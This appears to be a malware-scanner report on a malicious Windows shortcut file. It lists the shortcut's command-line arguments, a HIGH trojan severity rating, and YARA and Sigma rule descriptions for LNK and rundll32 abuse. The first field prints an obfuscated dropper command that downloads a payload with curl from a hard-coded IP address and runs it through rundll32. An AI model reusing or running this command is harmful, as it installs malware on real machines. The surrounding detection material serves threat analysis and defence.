lnk_info.command_line_arguments: /c iAs || ecHo iAs & P"ing" iAs || Cu"r"L ht"t"p://"135."125."177".95/syK"/t" -o %tMp%\iAs.log & P"ing" -n 4 iAs || rundll32 %TmP%\iAs.log scab /k besogon728 & E"xIT" 'rQhxHlGkoyKYX

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file with a long relative path. Might be used in an attempt to hide the path.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies Adobe Acrobat artefacts in shortcut (LNK) files. A PDF document is typically used as decoy in a malicious LNK.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

sigma_analysis_results.rule_description: Detects use of rundll32 as a LOLBAS binary where rundll32 is passed unexpected arguments such as a .iso instead of .dll (i.e. rundll32.exe test.iso, evilexport).
sigma_analysis_results.rule_title: LOLBAS rundll32 without expected arguments (via cmdline)
